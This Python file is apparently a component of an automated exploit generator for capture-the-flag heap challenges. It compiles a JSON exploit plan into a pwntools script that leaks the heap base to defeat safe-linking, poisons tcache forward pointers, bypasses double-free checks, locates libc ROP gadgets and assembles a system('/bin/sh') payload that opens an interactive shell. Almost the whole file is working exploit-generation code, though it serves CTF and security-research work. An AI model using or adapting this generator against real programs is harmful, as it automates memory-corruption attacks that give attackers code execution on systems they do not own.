import json
import os
import re
import ast
from pwn import ELF, ROP, context

context.log_level = 'error'

DEFAULT_CONFIG = {
    "index_base": 0,
    "reuse_index": False,
    "needs_size": False,
    "xor_leak_offset": 15,
    "data_prompt": "b'Data: '",
    "menu_prompt": "b'> '",
    "choices": {
        "create": "b'1'",
        "view": "b'2'",
        "edit": "b'3'",
        "delete": "b'4'",
    },
}


class IndexManager:
    """Manages chunk indices respecting the binary's index convention."""

    def __init__(self, index_base: int = 0, reuse_index: bool = True):
        self.index_base = index_base
        self.reuse_index = reuse_index
        self.registry = {}
        self.next_idx = index_base
        self.freed = set()

    def get_idx(self, tag: str) -> int:
        if tag in self.registry:
            return self.registry[tag]
        if self.reuse_index and self.freed:
            idx = min(self.freed)
            self.freed.remove(idx)
        else:
            idx = self.next_idx
            self.next_idx += 1
        self.registry[tag] = idx
        return idx

    def free_idx(self, tag: str):
        if tag in self.registry and self.reuse_index:
            self.freed.add(self.registry[tag])

    def preassign(self, tag: str, idx: int):
        self.registry[tag] = idx
        if idx >= self.next_idx:
            self.next_idx = idx + 1


class HeapDSLCompiler:
    """Compiles Heap IR into pwntools code, respecting binary structure from config."""

    def __init__(self, plan: dict, solve_path: str = None, libc_path: str = None,
                 symbolic_results: dict = None, critical_vars: dict = None):
        self.plan = plan
        self.libc_elf = None
        self.libc_path = libc_path
        self._load_libc()

        self.config = self._extract_config(solve_path)
        self.interface_code = self._extract_interface(solve_path)
        self.signatures = self._detect_signatures_from_code(self.interface_code)

        self.data_prompt = self.config.get("data_prompt", "b'Data: '")
        self.menu_prompt = self.config.get("menu_prompt", "b'> '")

        self.index_mgr = None
        self.code_lines = []
        self.symbolic_results = symbolic_results or {}
        self.critical_vars = critical_vars or {}

    def _load_libc(self):
        if self.libc_path and os.path.exists(self.libc_path):
            try:
                self.libc_elf = ELF(self.libc_path, checksec=False)
            except Exception:
                self.libc_elf = None

    # ─── Config parsing ────────────────────────────────────────────

    def _extract_config(self, solve_path: str = None) -> dict:
        """Parse AUTOPWN_CONFIG dict from solve.py."""
        if not solve_path or not os.path.exists(solve_path):
            return dict(DEFAULT_CONFIG)

        try:
            with open(solve_path, "r") as f:
                content = f.read()
            m = re.search(
                r"AUTOPWN_CONFIG\s*=\s*(\{.+?\})\s*\n\s*(?:#|'''|\"\"\")",
                content,
                re.DOTALL,
            )
            if m:
                raw = m.group(1)
                parsed = ast.literal_eval(raw)
                if isinstance(parsed, dict):
                    merged = dict(DEFAULT_CONFIG)
                    merged.update(parsed)
                    return merged
        except Exception:
            pass
        return dict(DEFAULT_CONFIG)

    def _extract_interface(self, solve_path: str = None) -> str:
        default = (
            "def sla(rgx, data): p.sendlineafter(rgx, data)\n"
            "def sa(rgx, data): p.sendafter(rgx, data)\n"
            "def create(idx, size, data): sla(b'> ', b'1'); sla(b': ', str(idx).encode()); sla(b': ', str(size).encode()); sa(b': ', data)\n"
            "def delete(idx): sla(b'> ', b'2'); sla(b': ', str(idx).encode())\n"
            "def view(idx): sla(b'> ', b'3'); sla(b': ', str(idx).encode())\n"
            "def edit(idx, data): sla(b'> ', b'4'); sla(b': ', str(idx).encode()); sa(b': ', data)"
        )
        if not solve_path or not os.path.exists(solve_path):
            return default
        try:
            with open(solve_path, "r") as f:
                content = f.read()
            script_marker = "# --- SCRIPT ---"
            interface_section = content[:content.index(script_marker)] if script_marker in content else content
            lines = interface_section.split('\n')
            defs = []
            current = []
            for line in lines:
                stripped = line.strip()
                if line.startswith('def '):
                    if current:
                        defs.append('\n'.join(current))
                    current = [line.rstrip()]
                elif current and (stripped == '' or line.startswith('    ') or line.startswith('\t')):
                    current.append(line.rstrip())
                elif current:
                    defs.append('\n'.join(current))
                    current = []
            if current:
                defs.append('\n'.join(current))
            return "\n".join(d.strip() for d in defs) if defs else default
        except Exception:
            return default

    def _detect_signatures_from_code(self, code: str) -> dict:
        sigs = {
            "create": ["idx", "size", "data"],
            "delete": ["idx"],
            "view": ["idx"],
            "edit": ["idx", "data"],
        }
        for func in sigs.keys():
            patterns = [r"def\s+" + func + r"\s*\((.*?)\):"]
            if func == "delete":
                patterns.append(r"def\s+free\s*\((.*?)\):")
            if func == "view":
                patterns.append(r"def\s+read_data\s*\((.*?)\):")
            for pat in patterns:
                match = re.search(pat, code)
                if match:
                    sigs[func] = [a.strip() for a in match.group(1).split(",")]
                    break
        return sigs

    # ─── Call generation ───────────────────────────────────────────

    def _gen_call(self, func: str, args_map: dict) -> str:
        func_name = func
        if func == "delete" and "def free" in self.interface_code:
            func_name = "free"
        if func == "view" and "def read_data" in self.interface_code:
            func_name = "read_data"

        sig = self.signatures.get(func, [])
        call_args = []
        needs_size = self.config.get("needs_size", False)

        for param in sig:
            if param in args_map:
                call_args.append(str(args_map[param]))
            elif param == "size":
                if needs_size and "size" in args_map:
                    call_args.append(str(args_map["size"]))
                else:
                    pass
        return f"{func_name}({', '.join(call_args)})"

    # ─── Libc / ROP resolution ─────────────────────────────────────

    def _resolve_libc_expr(self, expr: str) -> str:
        if "LIBC_AUTO_OFFSET" not in expr or not self.libc_elf:
            return expr
        sym_offset = None
        for name in ["main_arena", "__malloc_hook", "__free_hook"]:
            if name in self.libc_elf.symbols:
                sym_offset = self.libc_elf.symbols[name]
                break
        if sym_offset is not None:
            return f"libc_leak - {hex(sym_offset + 0x60)}"
        return expr.replace("LIBC_AUTO_OFFSET", "0x1e7b20")

    def _resolve_calc_auto(self, instr: dict) -> str:
        expr = instr.get("expr", "")
        if instr.get("note") == "AUTO" and "LIBC_AUTO_OFFSET" in expr:
            return self._resolve_libc_expr(expr)
        return expr

    def _concretize_symbolic(self, instr: dict) -> dict:
        """Concretize symbolic values from symbolic results."""
        concretized = dict(instr)
        symval = instr.get("symval", "")
        symsize = instr.get("symsize", "")

        # Use symbolic results if available
        sym_results = self.symbolic_results.get("symbolic_results", [])
        for sr in sym_results:
            if sr.get("status") == "success" and sr.get("concretized"):
                conc = sr["concretized"]
                if conc.get("symval") == symval:
                    concretized["concrete_target"] = conc.get("concrete_target", symval)
                    break

        # Default concretization for sizes
        if symsize and "concrete_size" not in concretized:
            if "0x78" in str(symsize):
                concretized["concrete_size"] = 0x79
            elif "0x18" in str(symsize):
                concretized["concrete_size"] = 0x20
            else:
                concretized["concrete_size"] = 0x30

        return concretized

    def _find_rop_gadgets(self) -> tuple:
        pop_rdi = None
        ret = None
        if self.libc_elf:
            try:
                rop = ROP(self.libc_elf)
                found = rop.find_gadget(["pop rdi", "ret"])
                if found:
                    pop_rdi = found[0]
                found = rop.find_gadget(["ret"])
                if found:
                    ret = found[0]
            except Exception:
                pass
            if pop_rdi is None:
                try:
                    pop_rdi = next(self.libc_elf.search(b"\x5f\xc3"))
                except StopIteration:
                    pass
            if ret is None:
                try:
                    ret = next(self.libc_elf.search(b"\xc3"))
                except StopIteration:
                    pass
        return pop_rdi, ret

    # ─── Main compilation ──────────────────────────────────────────

    def compile(self, binary_name: str = "chall_patched") -> str:
        self.code_lines = code = []

        index_base = self.config.get("index_base", 0)
        reuse_index = self.config.get("reuse_index", True)
        self.index_mgr = IndexManager(index_base=index_base, reuse_index=reuse_index)

        data_prompt = self.data_prompt
        needs_size = self.config.get("needs_size", False)

        # Detect main size from plan
        main_size = 0x30
        for stage in self.plan.get("path", []):
            for instr in stage.get("ir", []):
                if instr["op"] == "ALLOC":
                    main_size = instr["size"]
                    break
            if main_size != 0x30:
                break

        # Resolve dynamic libc expression
        libc_calc_expr = None
        for stage in self.plan.get("path", []):
            for instr in stage.get("ir", []):
                if instr["op"] == "CALC" and instr.get("note") == "AUTO":
                    libc_calc_expr = self._resolve_calc_auto(instr)

        pop_rdi_gadget, ret_gadget = self._find_rop_gadgets()

        code.extend([
            "#!/usr/bin/env python3",
            "from pwn import *",
            "import os",
            "",
            "context.arch = 'amd64'",
            "DIR = os.path.dirname(os.path.abspath(__file__))",
            "os.chdir(DIR)",
            "",
            f"exe = ELF('./{binary_name}', checksec=False)",
            "libc = exe.libc",
            "",
            "def start(): return process(exe.path)",
            "p = start()",
            "",
            "# --- INTERFACE (Transplanted from solve.py) ---",
            self.interface_code,
            "",
            "def protect_ptr(ptr, pos): return ptr ^ (pos >> 12)",
            "",
            "# --- PRE-EXPLOIT SETUP (Bypass Safe Linking) ---",
        ])

        xor_leak_offset = self.config.get("xor_leak_offset", 15)
        xor_leak_idx = index_base + xor_leak_offset
        code.append(self._gen_call("create", {
            "idx": xor_leak_idx,
            "size": hex(main_size),
            "data": "b'leak_xor'",
        }))
        code.append(self._gen_call("delete", {"idx": xor_leak_idx}))
        code.append(self._gen_call("view", {"idx": xor_leak_idx}))
        code.extend([
            "xor_key = u64(p.recvn(5).ljust(8, b'\\x00'))",
            "heap_base = xor_key << 12",
            "log.success(f'Heap Base: {hex(heap_base)}')",
            "",
        ])

        code.append("# --- COMPILED PRECISE EXPLOIT IR ---")
        for stage in self.plan.get("path", []):
            code.append(f"# STAGE: {stage['name']}")
            for instr in stage.get("ir", []):
                # Concretize symbolic values if present
                instr = self._concretize_symbolic(instr)

                op = instr["op"]
                tag = instr.get("tag")
                idx = self.index_mgr.get_idx(tag) if tag else None

                if op == "ALLOC":
                    data = instr.get("data", "b'AutoPwn'")
                    if isinstance(data, str):
                        if not (data.startswith("b'") or "p64(" in data or "payload" in data):
                            data = f"b'{data}'"
                    args = {"idx": idx, "data": data}
                    if needs_size:
                        args["size"] = hex(instr["size"])
                    code.append(self._gen_call("create", args))

                elif op == "FREE":
                    code.append(self._gen_call("delete", {"idx": idx}))
                    self.index_mgr.free_idx(tag)

                elif op == "DOUBLE_FREE_BYPASS":
                    code.append(self._gen_call("edit", {"idx": idx, "data": "p64(0)*2"}))
                    code.append(self._gen_call("delete", {"idx": idx}))

                elif op == "ALLOC_ROP":
                    if pop_rdi_gadget is not None and ret_gadget is not None:
                        code.append(f"pop_rdi = libc.address + {hex(pop_rdi_gadget)}")
                        code.append(f"ret = libc.address + {hex(ret_gadget)}")
                    else:
                        code.append("pop_rdi = libc.address + 0x0000000000102dea")
                        code.append("ret = pop_rdi + 1")
                    code.append("binsh = next(libc.search(b'/bin/sh'))")
                    code.append("payload = p64(0) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(libc.symbols['system'])")
                    args = {"idx": idx, "data": "payload"}
                    if needs_size:
                        args["size"] = hex(instr["size"])
                    code.append(self._gen_call("create", args))

                elif op == "POISON_FD":
                    target_expr = instr.get("target", "0")
                    pos_expr = instr.get("pos", "0")
                    code.append(self._gen_call("edit", {
                        "idx": idx,
                        "data": f"p64(protect_ptr({target_expr}, {pos_expr}))",
                    }))

                elif op == "READ_VAL":
                    code.append(self._gen_call("view", {"idx": idx}))
                    if instr.get("offset"):
                        code.append(f"p.recvn({instr['offset']})")
                    save_as = instr["save_as"]
                    code.append(f"{save_as} = u64(p.recvn(6).ljust(8, b'\\x00'))")
                    code.append(f"log.success(f'{save_as}: {{hex({save_as})}}')")

                elif op == "CALC":
                    resolved = instr.get("expr", "")
                    if instr.get("note") == "AUTO" and libc_calc_expr:
                        resolved = libc_calc_expr
                    code.append(f"{instr['var']} = {resolved}")
                    code.append(f"log.success(f'{instr['var']} base: {{hex({instr['var']})}}')")

            code.append("")

        code.append("p.interactive()")
        return "\n".join(code)

    def save(self, filename: str, binary_name: str = "chall_patched"):
        with open(filename, "w") as f:
            f.write(self.compile(binary_name))
        print(f"[COMPLETE] Compiled Exploit IR to: {filename}")


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", default="chall_patched")
    parser.add_argument("--libc", default=None)
    parser.add_argument("--solve", default=None)
    parser.add_argument("--symbolic", default="../artifacts/symbolic_results.json")
    parser.add_argument("--critical", default="../artifacts/critical_vars.json")
    args = parser.parse_args()

    with open("../artifacts/final_plan.json", "r") as f:
        plan = json.load(f)

    symbolic_results = {}
    if os.path.exists(args.symbolic):
        with open(args.symbolic, "r") as f:
            symbolic_results = json.load(f)

    critical_vars = {}
    if os.path.exists(args.critical):
        with open(args.critical, "r") as f:
            critical_vars = json.load(f)

    compiler = HeapDSLCompiler(plan, args.solve, args.libc, symbolic_results, critical_vars)
    compiler.save("../../outputs/exploits/exploit.py", args.binary)
